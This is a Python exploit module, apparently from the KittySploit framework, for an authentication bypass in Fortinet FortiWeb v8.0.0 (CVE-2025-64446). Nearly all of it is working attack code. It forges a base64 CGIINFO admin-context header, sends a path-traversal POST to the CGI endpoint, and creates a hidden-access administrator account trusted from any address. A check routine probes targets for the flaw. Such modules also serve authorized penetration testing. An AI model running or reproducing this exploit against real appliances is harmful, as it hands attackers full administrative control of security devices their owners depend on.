#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Fortinet FortiWeb CVE-2025-64446 Authentication Bypass
Exploits an authentication bypass vulnerability in FortiWeb v8.0.0 that allows
unauthorized access to administrative API endpoints via crafted CGI context headers.
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import json
import base64
import random
import string

class Module(Exploit, Http_client):
    
    __info__ = {
        "name": "Fortinet FortiWeb CVE-2025-64446 Authentication Bypass",
        "description": "FortiWeb v8.0.0 - Authentication bypass via CGI parsing vulnerability allowing unauthorized admin access (CVE-2025-64446)",
        "author": "KittySploit Team",
        "cve": "CVE-2025-64446",
        "platform": Platform.MULTI,
        "arch": [Arch.ALL],
        "references": [
            "CVE-2025-64446",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-64446",
            "https://www.fortinet.com/"
        ]
    }
    
    rhost = OptString("10.10.0.13", "Target FortiWeb hostname or IP", required=True)
    rport = OptPort(443, "Target port", required=True)
    ssl = OptBool(True, "Use SSL/TLS", required=True)
    verify_ssl = OptBool(False, "Verify SSL certificate", required=True)
    
    # Admin user creation options
    username = OptString("", "Username for new admin user (random if empty)", required=False)
    password = OptString("", "Password for new admin user (random if empty)", required=False)
    access_profile = OptString("prof_admin", "Access profile for new user", required=False)
    
    def __init__(self, framework=None):
        super().__init__(framework)
    
    def _generate_random_string(self, length=8):
        """Generate random string for username/password"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _generate_cgiinfo_header(self):
        """Generate CGIINFO header with base64 encoded admin context"""
        # CGIINFO contains admin user context in JSON format
        cgi_data = {
            "username": "admin",
            "profname": "prof_admin",
            "vdom": "root",
            "loginname": "admin"
        }
        
        # Encode to base64
        json_str = json.dumps(cgi_data, separators=(',', ': '))
        base64_encoded = base64.b64encode(json_str.encode()).decode()
        
        return base64_encoded
    
    def _generate_user_data(self):
        """Generate user creation data"""
        # Generate random username/password if not provided
        username = self.username.value if self.username.value else self._generate_random_string(8)
        password = self.password.value if self.password.value else self._generate_random_string(12)
        
        user_data = {
            "data": {
                "q_type": 1,
                "name": username,
                "access-profile": self.access_profile.value,
                "access-profile_val": "0",
                "trusthostv4": "0.0.0.0/0",
                "trusthostv6": "::/0",
                "last-name": "",
                "first-name": "",
                "email-address": "",
                "phone-number": "",
                "mobile-number": "",
                "hidden": 0,
                "comments": "",
                "sz_dashboard": -1,
                "type": "local-user",
                "type_val": "0",
                "admin-usergrp_val": "0",
                "wildcard_val": "0",
                "accprofile-override_val": "0",
                "sshkey": "",
                "passwd-set-time": 0,
                "history-password-pos": 0,
                "history-password0": "",
                "history-password1": "",
                "history-password2": "",
                "history-password3": "",
                "history-password4": "",
                "history-password5": "",
                "history-password6": "",
                "history-password7": "",
                "history-password8": "",
                "history-password9": "",
                "force-password-change": "disable",
                "force-password-change_val": "0",
                "password": password
            }
        }
        
        return user_data, username, password
    
    def check(self):
        """Check if target is vulnerable"""
        try:
            target = self.rhost.value
            port = self.rport.value
            exploit_path = "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"
            
            print_info(f"Checking {target}:{port} for CVE-2025-64446...")
            
            # Prepare headers with CGIINFO
            cgiinfo = self._generate_cgiinfo_header()
            headers = {
                "CGIINFO": cgiinfo,
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "Connection": "keep-alive"
            }
            
            # Try a simple request to see if endpoint is accessible
            # We'll use a minimal payload for checking
            test_data = {
                "data": {
                    "q_type": 1,
                    "name": "test_check"
                }
            }
            
            try:
                response = self.http_request(
                    method="POST",
                    path=exploit_path,
                    headers=headers,
                    data=json.dumps(test_data),
                    timeout=10
                )
                
                if response and response.status_code == 200:
                    # Check if response contains expected structure
                    try:
                        response_json = response.json()
                        if "results" in response_json or "status" in response_json:
                            return {
                                'vulnerable': True,
                                'reason': 'Endpoint is accessible and returns expected structure',
                                'confidence': 'high'
                            }
                    except:
                        pass
                    
                    return {
                        'vulnerable': True,
                        'reason': 'Endpoint is accessible (HTTP 200)',
                        'confidence': 'medium'
                    }
                else:
                    return {
                        'vulnerable': False,
                        'reason': f'Endpoint returned status {response.status_code if response else "no response"}',
                        'confidence': 'medium'
                    }
                    
            except Exception as e:
                return {
                    'vulnerable': False,
                    'reason': f'Cannot connect to endpoint: {e}',
                    'confidence': 'low'
                }
                
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {e}',
                'confidence': 'low'
            }
    
    def run(self):
        """Execute the exploit"""
        try:
            target = self.rhost.value
            port = self.rport.value
            exploit_path = "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"
            
            print_info(f"Target: {target}:{port}")
            print_info(f"Exploit path: {exploit_path}")
            print_warning("CVE-2025-64446: This vulnerability allows unauthorized admin access")
            
            # Generate CGIINFO header
            cgiinfo = self._generate_cgiinfo_header()
            print_info(f"CGIINFO header: {cgiinfo[:50]}...")
            
            # Generate user data
            user_data, username, password = self._generate_user_data()
            print_info(f"Creating admin user: {username}")
            print_info(f"Password: {password}")
            print_info(f"Access profile: {self.access_profile.value}")
            
            # Prepare headers
            headers = {
                "CGIINFO": cgiinfo,
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "Connection": "keep-alive"
            }
            
            print_info("Sending exploit request...")
            
            try:
                response = self.http_request(
                    method="POST",
                    path=exploit_path,
                    headers=headers,
                    data=json.dumps(user_data),
                    timeout=30
                )
                
                if not response:
                    print_error("No response received from server")
                    fail.Message("Exploit failed: No response from server")
                    return False
                
                print_info(f"Response status: {response.status_code}")
                
                # Check response
                if response.status_code == 200:
                    try:
                        response_json = response.json()
                        
                        # Check if user was created successfully
                        if "results" in response_json:
                            results = response_json["results"]
                            if "name" in results and results["name"] == username:
                                print_success("Exploit executed successfully!")
                                print_success(f"Admin user '{username}' created with password '{password}'")
                                print_info(f"Access profile: {results.get('access-profile', 'N/A')}")
                                print_info(f"User type: {results.get('type', 'N/A')}")
                                
                                # Display full response if verbose
                                print_info("Full response:")
                                print_info(json.dumps(response_json, indent=2))
                                
                                return True
                            else:
                                print_warning("Request succeeded but user creation may have failed")
                                print_info("Response:")
                                print_info(json.dumps(response_json, indent=2))
                                return True  # Still consider it a success if we got 200
                        else:
                            print_warning("Unexpected response structure")
                            print_info("Response:")
                            print_info(response.text[:500])
                            return True  # HTTP 200 is still a success indicator
                            
                    except json.JSONDecodeError:
                        print_warning("Response is not valid JSON")
                        print_info(f"Response text: {response.text[:500]}")
                        if response.status_code == 200:
                            print_success("HTTP 200 received - exploit may have succeeded")
                            return True
                        return False
                else:
                    print_error(f"Exploit failed: HTTP {response.status_code}")
                    print_info(f"Response: {response.text[:500]}")
                    fail.Message(f"Exploit failed: HTTP {response.status_code}")
                    return False
                    
            except Exception as e:
                print_error(f"Request failed: {e}")
                fail.Message(f"Request failed: {e}")
                return False
                
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            fail.Message(f"Exploitation failed: {e}")
            return False

